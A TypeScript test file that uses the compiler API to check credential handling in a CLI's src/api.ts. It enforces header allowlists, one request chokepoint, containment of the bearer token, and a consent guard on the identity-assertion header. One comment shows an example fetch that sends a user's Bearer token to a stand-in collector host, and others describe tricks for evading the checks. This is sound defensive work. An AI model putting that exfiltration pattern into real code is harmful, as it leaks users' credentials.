/**
 * Structural checks on how `src/api.ts` handles credentials: the properties a
 * behavioural test cannot express, asserted against its source.
 *
 * Why this lives in `scripts/`: `src/api.ts` attaches every outbound credential
 * (the `Bearer` access token and the `x-wego-id-token` identity assertion) but
 * is deliberately not in `.github/CODEOWNERS`, because owning ~1,700 churning
 * lines would put the release signers on nearly every pull request. The repo is
 * public and takes outside contributions, so a change to how a credential is
 * sent otherwise needs only one ordinary reviewer. `scripts/` is code-owned:
 * loosening credential handling in `src/api.ts` fails this file, and silencing
 * this file needs a release signer.
 *
 * Split with `src/api.test.ts`:
 *
 *   - `src/api.test.ts` owns behaviour. It drives the real functions through
 *     the injected `HttpFetch` and inspects the resulting `Headers`, which
 *     survives any refactor.
 *   - This file owns absence, which a behavioural test cannot observe:
 *
 *         "no header leaves this file that is not on a list"
 *         "there is exactly one place that issues a request"
 *         "a credential never reaches a URL, a body, or any other call"
 *
 * Re-asserting behavioural properties structurally here is brittle (it breaks
 * on behaviour-preserving edits that `src/api.test.ts` passes). Before adding a
 * rule, check whether it can be a behavioural test in `src/api.test.ts`; if it
 * can, it belongs there.
 *
 * Limits:
 *
 *   - A novel credential path can satisfy every rule below, most obviously one
 *     in another module. This is friction and detection, not prevention; a
 *     reviewer still has to think.
 *   - It does not protect `src/api.ts` from a release signer. The threat model
 *     is an outsider's pull request seen by one ordinary reviewer.
 *   - The collectors fail closed on shapes they cannot read, but that is not the
 *     same as seeing everything.
 *
 * The stronger fix is a separate, owned `src/api-credentials.ts`, which would
 * make this class of change impossible rather than detectable and reduce this
 * file to its header allowlist. That is tracked separately.
 *
 * A type checker is used because two rules are about binding, not text ("this
 * call goes through the injected parameter", "this value came from the
 * credential"), which name matching cannot answer. `noResolve`/`noLib` keep the
 * program to this one file. `bun run test` runs only in unprivileged jobs
 * (`ci-cli`, and `release-cli.yml`'s `prepare`, which holds neither
 * `id-token: write` nor the store environment).
 */
import { describe, expect, it } from "bun:test";
import ts from "typescript";

const SOURCE_PATH = "src/api.ts";

const program = ts.createProgram([SOURCE_PATH], {
  noResolve: true,
  noLib: true,
  target: ts.ScriptTarget.Latest,
});
const checker = program.getTypeChecker();
const sourceFile = program.getSourceFile(SOURCE_PATH) as ts.SourceFile;

const where = (node: ts.Node): string => {
  const line = sourceFile.getLineAndCharacterOfPosition(
    node.getStart(sourceFile),
  ).line;
  return `${SOURCE_PATH}:${line + 1}`;
};

const normalize = (text: string): string => text.replace(/\s+/g, " ").trim();

const cite = (node: ts.Node): string =>
  `${where(node)}: ${normalize(node.getText(sourceFile))}`;

function* walk(node: ts.Node): Generator<ts.Node> {
  yield node;
  for (const child of node.getChildren(sourceFile)) yield* walk(child);
}

const allNodes = [...walk(sourceFile)];

/** The static text of a name or string-ish literal, or `undefined` when it is
 *  computed. Every allowlist below turns `undefined` into an unlistable name
 *  rather than skipping it, so a computed key fails instead of slipping past. */
function staticName(node: ts.Node | undefined): string | undefined {
  if (node === undefined) return undefined;
  if (ts.isIdentifier(node)) return node.text;
  if (ts.isStringLiteralLike(node)) return node.text;
  return undefined;
}

/** Header names are case-insensitive on the wire, so comparisons here are too. */
const headerKey = (name: string): string => name.toLowerCase();

/** Resolved via the checker rather than by text. `{ ...rest, token }` needs the
 *  shorthand branch: the identifier there is the property's name, so asking
 *  about it directly returns the property symbol and misses the value read. */
function declarationOf(node: ts.Node): ts.Declaration | undefined {
  const target =
    ts.isIdentifier(node) && ts.isShorthandPropertyAssignment(node.parent)
      ? node.parent
      : node;
  const symbol = ts.isShorthandPropertyAssignment(target)
    ? checker.getShorthandAssignmentValueSymbol(target)
    : checker.getSymbolAtLocation(target);
  return symbol?.declarations?.[0];
}

function isParameterOf(
  node: ts.Node,
  fn: ts.SignatureDeclaration | undefined,
): boolean {
  const declaration = declarationOf(node);
  return (
    declaration !== undefined &&
    fn !== undefined &&
    ts.isParameter(declaration) &&
    declaration.parent === fn
  );
}

/** The name of the nearest enclosing function, for grouping call sites. */
function enclosingFunctionName(node: ts.Node): string {
  for (let scope = node.parent; scope !== undefined; scope = scope.parent) {
    if (ts.isFunctionDeclaration(scope)) {
      return scope.name?.text ?? "<anonymous>";
    }
    if (ts.isFunctionExpression(scope) || ts.isArrowFunction(scope)) {
      return "<anonymous>";
    }
  }
  return "<module scope>";
}

// ---------------------------------------------------------------------------
// Header bags: what counts as one, and the rule that an unfamiliar one fails
// ---------------------------------------------------------------------------

/** Every identifier bound to a `new Headers(...)`. */
const headerBagNames = new Set(
  allNodes
    .filter(
      (node): node is ts.VariableDeclaration =>
        ts.isVariableDeclaration(node) &&
        node.initializer !== undefined &&
        ts.isNewExpression(node.initializer) &&
        staticName(node.initializer.expression) === "Headers",
    )
    .map((node) => staticName(node.name))
    .filter((name): name is string => name !== undefined),
);

/** The trailing name of a `.set(...)` receiver: `headers` for `headers.set`,
 *  `headers` for `init.headers.set`, `requestHeaders` for
 *  `requestHeaders.set`. */
function receiverName(expr: ts.Expression): string | undefined {
  if (ts.isIdentifier(expr)) return expr.text;
  if (ts.isPropertyAccessExpression(expr)) return expr.name.text;
  return undefined;
}

/** Every write to a header bag. Matched two ways because either alone leaves a
 *  hole: a bag called `h` slips a name rule, and one that is assigned rather
 *  than declared slips a `new Headers` rule. `res.headers.get(...)` is a READ
 *  of a response and is deliberately not here. */
const headerSetCalls = allNodes.filter((node): node is ts.CallExpression => {
  if (!ts.isCallExpression(node)) return false;
  if (!ts.isPropertyAccessExpression(node.expression)) return false;
  if (node.expression.name.text !== "set") return false;
  const name = receiverName(node.expression.expression);
  return (
    name !== undefined && (headerBagNames.has(name) || /headers?$/i.test(name))
  );
});

/** Every `headers:` property, whatever its value. The rules below reject the
 *  ones whose value is not a plain object literal rather than skipping them. */
const headerProperties = allNodes.filter(
  (node): node is ts.PropertyAssignment =>
    ts.isPropertyAssignment(node) && staticName(node.name) === "headers",
);

/** Includes spreads: dropping them here would let a spread go unchecked. */
const inlineHeaderMembers = headerProperties
  .filter((node) => ts.isObjectLiteralExpression(node.initializer))
  .flatMap(
    (node) => (node.initializer as ts.ObjectLiteralExpression).properties,
  );

// ---------------------------------------------------------------------------
// The closed set of headers
// ---------------------------------------------------------------------------

/**
 * Every header name `src/api.ts` may attach through a header bag, and what each
 * carries. Anything not listed fails, so a new header cannot be added quietly.
 *
 * To add one, add it here in the same pull request with what it carries. The
 * edit is in `scripts/`, so it needs a release signer.
 */
const ALLOWED_SET_HEADERS: Record<string, string> = {
  "user-agent": "build identification; carries no user data",
  "x-wego-session-id": "analytics uuid, pushed in per invocation",
  "x-wego-client-id": "analytics uuid, pushed in per invocation",
  "x-wego-app-version": "build version",
  "x-wego-os-type": "machine fact, not stored telemetry",
  "x-wego-os-version": "machine fact, not stored telemetry",
  "x-wego-timezone": "utc offset, computed per request",
  "x-wego-id-token": "THE identity assertion - gated below",
};

/** The same closed set for headers written inline into a `fetch` init object.
 *  A separate mechanism, so a separate list: a credential added there would
 *  never touch a `.set` call. */
const ALLOWED_LITERAL_HEADERS: Record<string, string> = {
  authorization: "THE access token",
  "content-type": "request body encoding, JSON on the POST path",
};

/** A header name as the allowlist sees it. A computed key becomes an unlistable
 *  string rather than a skipped entry, so it fails like any unknown name. */
const listedAs = (name: string | undefined, node: ts.Node): string =>
  name === undefined ? `<computed at ${where(node)}>` : headerKey(name);

describe("no header leaves this file without being listed here", () => {
  it("builds exactly one header bag", () => {
    // The count is the property, not the name: one bag keeps "every header
    // this file sends" a list a reviewer can read in full.
    expect({ bags: [...headerBagNames], count: headerBagNames.size }).toEqual({
      bags: [...headerBagNames],
      count: 1,
    });
  });

  it("writes only allowlisted names to the header bag", () => {
    const names = headerSetCalls.map((call) =>
      listedAs(staticName(call.arguments[0]), call),
    );
    expect([...new Set(names)].sort()).toEqual(
      Object.keys(ALLOWED_SET_HEADERS).sort(),
    );
  });

  it("builds every inline header bag as a plain object literal", () => {
    // `headers: buildHeaders(token)` moves the decision somewhere this file
    // cannot see, so fail rather than skip it.
    const opaque = headerProperties
      .filter((node) => !ts.isObjectLiteralExpression(node.initializer))
      .map(cite);
    expect(opaque).toEqual([]);
  });

  it("writes every inline header as a named property, never a spread", () => {
    // `{ ...credentialHeaders, "Content-Type": "application/json" }` leaves the
    // name list unchanged while adding any header it likes.
    const unreadable = inlineHeaderMembers
      .filter((member) => !ts.isPropertyAssignment(member))
      .map(cite);
    expect(unreadable).toEqual([]);
  });

  it("writes only allowlisted names into inline header objects", () => {
    const names = inlineHeaderMembers
      .filter(ts.isPropertyAssignment)
      .map((prop) => listedAs(staticName(prop.name), prop));
    expect([...new Set(names)].sort()).toEqual(
      Object.keys(ALLOWED_LITERAL_HEADERS).sort(),
    );
  });
});

// ---------------------------------------------------------------------------
// One door, and a closed list of who may use it
// ---------------------------------------------------------------------------

/**
 * `src/api.test.ts` can prove the headers a request carries, but not that no
 * other request exists. This satisfies every header rule above while sending
 * the user's token to an arbitrary host:
 *
 *     await fetch("https://collector.example/ingest", {
 *       headers: { Authorization: `Bearer ${accessToken}` },
 *     });
 *
 * `src/target.ts` and `src/config.ts` (both code-owned) decide which host may
 * receive a credential and refuse cleartext. These rules stop `src/api.ts`
 * going around them.
 */
const REQUEST_CHOKEPOINT = "fetchOrUnreachable";
const ALLOWED_CHOKEPOINT_CALLERS: Record<string, string> = {
  authedJsonGet: "the shared authenticated GET envelope",
  authedJsonPost: "the shared authenticated POST envelope",
};

const chokepoint = allNodes.find(
  (node): node is ts.FunctionDeclaration =>
    ts.isFunctionDeclaration(node) && node.name?.text === REQUEST_CHOKEPOINT,
);

describe("exactly one place issues a request", () => {
  it("references the global fetch only as the injected default", () => {
    // `http: HttpFetch = fetch` is the one permitted mention: it makes the
    // transport swappable for `src/api.test.ts`. Any other `fetch` here is a
    // second request path.
    const stray = allNodes
      .filter(
        (node): node is ts.Identifier =>
          ts.isIdentifier(node) && node.text === "fetch",
      )
      .filter((node) => !ts.isParameter(node.parent))
      .map(cite);
    expect(stray).toEqual([]);
  });

  it("reaches the network only through the injected transport", () => {
    // Also pins that the chokepoint still exists: if it were renamed, the
    // caller rule below would silently stop applying.
    expect(chokepoint?.body).toBeDefined();
    const viaInjected = [...walk(chokepoint?.body as ts.Node)]
      .filter(ts.isCallExpression)
      .filter((call) => isParameterOf(call.expression, chokepoint));
    expect(viaInjected.map(where)).toHaveLength(1);
  });

  it("is reached only from the allowlisted callers", () => {
    // Fails by default: a new request path (endpoint, retry helper, health
    // check) has to add its name here first.
    const callers = allNodes
      .filter(
        (node): node is ts.CallExpression =>
          ts.isCallExpression(node) &&
          staticName(node.expression) === REQUEST_CHOKEPOINT,
      )
      .map(enclosingFunctionName);
    expect([...new Set(callers)].sort()).toEqual(
      Object.keys(ALLOWED_CHOKEPOINT_CALLERS).sort(),
    );
  });
});

// ---------------------------------------------------------------------------
// Where a credential may travel
// ---------------------------------------------------------------------------

/** The parameter position an argument is passed into, or `undefined` when the
 *  node is not a call argument. */
function parameterReceiving(
  node: ts.Node,
): ts.ParameterDeclaration | undefined {
  const call = node.parent;
  if (call === undefined || !ts.isCallExpression(call)) return undefined;
  const index = call.arguments.indexOf(node as ts.Expression);
  if (index < 0) return undefined;
  const callee = declarationOf(call.expression);
  if (callee === undefined || !ts.isFunctionLike(callee)) return undefined;
  return callee.parameters[index];
}

/** The single interpolation of a `Bearer ` template is the one place a
 *  credential may become text. */
function isTheBearerInterpolation(node: ts.Node): boolean {
  const span = node.parent;
  if (span === undefined || !ts.isTemplateSpan(span)) return false;
  const template = span.parent;
  return (
    ts.isTemplateExpression(template) &&
    template.head.text === "Bearer " &&
    template.templateSpans.length === 1
  );
}

/**
 * The credential parameters, derived rather than named, so a rename cannot
 * switch the guard off.
 *
 *   SEED     every parameter interpolated into a `Bearer ` template.
 *   CLOSURE  any parameter passed into a credential parameter's position is
 *            itself carrying the credential. Iterated to a fixed point, since
 *            the CLI threads the token down several layers.
 */
const credentialParams = new Set<ts.ParameterDeclaration>();

for (const node of allNodes) {
  if (!ts.isTemplateExpression(node)) continue;
  if (node.head.text !== "Bearer " || node.templateSpans.length !== 1) continue;
  const seed = declarationOf(node.templateSpans[0]?.expression as ts.Node);
  if (seed !== undefined && ts.isParameter(seed)) credentialParams.add(seed);
}

for (let growing = true; growing; ) {
  growing = false;
  for (const node of allNodes) {
    if (!ts.isIdentifier(node)) continue;
    const target = parameterReceiving(node);
    if (target === undefined || !credentialParams.has(target)) continue;
    const source = declarationOf(node);
    if (
      source !== undefined &&
      ts.isParameter(source) &&
      !credentialParams.has(source)
    ) {
      credentialParams.add(source);
      growing = true;
    }
  }
}

describe("a credential is only forwarded, or put in the Bearer header", () => {
  const references = allNodes
    .filter(ts.isIdentifier)
    .filter((node) => !ts.isParameter(node.parent))
    .filter((node) => {
      const declaration = declarationOf(node);
      return (
        declaration !== undefined &&
        ts.isParameter(declaration) &&
        credentialParams.has(declaration)
      );
    });

  it("found the credential parameters to check", () => {
    // Without this the rule below is vacuous: if the seed stops matching, the
    // set is empty and the check passes having checked nothing.
    expect(credentialParams.size).toBeGreaterThan(0);
    expect(references.length).toBeGreaterThan(0);
  });

  it("never lets a credential reach a URL, a body, or any other call", () => {
    // The header allowlists cannot catch a token put into a URL, a JSON body
    // or a logger, since it never touches a header.
    const escaped = references
      .filter((node) => {
        const target = parameterReceiving(node);
        const forwarded = target !== undefined && credentialParams.has(target);
        return !forwarded && !isTheBearerInterpolation(node);
      })
      .map(cite);
    expect(escaped).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Consent is never re-decided
// ---------------------------------------------------------------------------

/**
 * The one behavioural property deliberately also checked here.
 *
 * `src/api.test.ts` tests "a refresh cannot turn the header on for someone who
 * opted out", but that file is unowned, so one pull request could flip the
 * behaviour and delete the test. Every other rule here would stay green (the
 * header is allowlisted, no new request, no credential moves). Sending an
 * identity assertion for a user who declined is the quietest bad change
 * possible in `src/api.ts`, so it gets a second, owned guard.
 */
const CONSENT_CONJUNCTS = [
  "identityAssertion.allowed",
  "identityAssertion.token",
];

/** Flattens an `&&` chain so `a && b` and `b && a` count as the same guard. */
function conjunctsOf(expr: ts.Expression): string[] {
  if (
    ts.isBinaryExpression(expr) &&
    expr.operatorToken.kind === ts.SyntaxKind.AmpersandAmpersandToken
  ) {
    return [...conjunctsOf(expr.left), ...conjunctsOf(expr.right)];
  }
  return [normalize(expr.getText(sourceFile))];
}

const refresh = allNodes.find(
  (node): node is ts.FunctionDeclaration =>
    ts.isFunctionDeclaration(node) &&
    node.name?.text === "refreshIdentityAssertion",
);

const refreshNodes = refresh?.body === undefined ? [] : [...walk(refresh.body)];

describe("consent is never re-decided", () => {
  it("sends the identity assertion only under both conjuncts", () => {
    const idTokenSets = headerSetCalls.filter(
      (call) =>
        headerKey(staticName(call.arguments[0]) ?? "") === "x-wego-id-token",
    );
    expect(idTokenSets.map(where)).toHaveLength(1);

    // Scope, not proximity: an `if` whose ELSE branch holds the call, or one
    // the call merely follows, must not count.
    const guards: string[][] = [];
    let node: ts.Node = idTokenSets[0] as ts.Node;
    while (node.parent !== undefined) {
      const parent: ts.Node = node.parent;
      if (ts.isIfStatement(parent) && parent.thenStatement === node) {
        guards.push(conjunctsOf(parent.expression).sort());
      }
      node = parent;
    }
    expect(guards).toContainEqual([...CONSENT_CONJUNCTS].sort());
  });

  it("never gives `allowed` a value other than the one already stored", () => {
    // Reading the stored consent back is fine; deciding a new one is not. The
    // rule is about the value, not the mention: `{ ...identityAssertion,
    // token }` and `{ token, allowed: identityAssertion.allowed }` must both
    // pass.
    expect(refresh?.body).toBeDefined();
    const CARRIED_FORWARD = "identityAssertion.allowed";

    const offenders = refreshNodes
      .filter((node) => {
        if (
          ts.isPropertyAssignment(node) &&
          staticName(node.name) === "allowed"
        ) {
          return (
            normalize(node.initializer.getText(sourceFile)) !== CARRIED_FORWARD
          );
        }
        // `{ allowed }` shorthand takes its value from a local, never from the
        // stored state, so it is always a new decision.
        if (
          ts.isShorthandPropertyAssignment(node) &&
          staticName(node.name) === "allowed"
        ) {
          return true;
        }
        if (
          ts.isBinaryExpression(node) &&
          node.operatorToken.kind === ts.SyntaxKind.EqualsToken &&
          ts.isPropertyAccessExpression(node.left) &&
          node.left.name.text === "allowed"
        ) {
          return normalize(node.right.getText(sourceFile)) !== CARRIED_FORWARD;
        }
        return false;
      })
      .map(cite);

    expect(offenders).toEqual([]);
  });

  it("uses no computed property name in the refresh", () => {
    // `{ ["allow" + "ed"]: true }` would evade the rule above, and has no
    // legitimate use in a three-line function.
    const computed = refreshNodes
      .filter(
        (node) =>
          (ts.isPropertyAssignment(node) ||
            ts.isShorthandPropertyAssignment(node)) &&
          staticName(node.name) === undefined,
      )
      .map(cite);
    expect(computed).toEqual([]);
  });
});
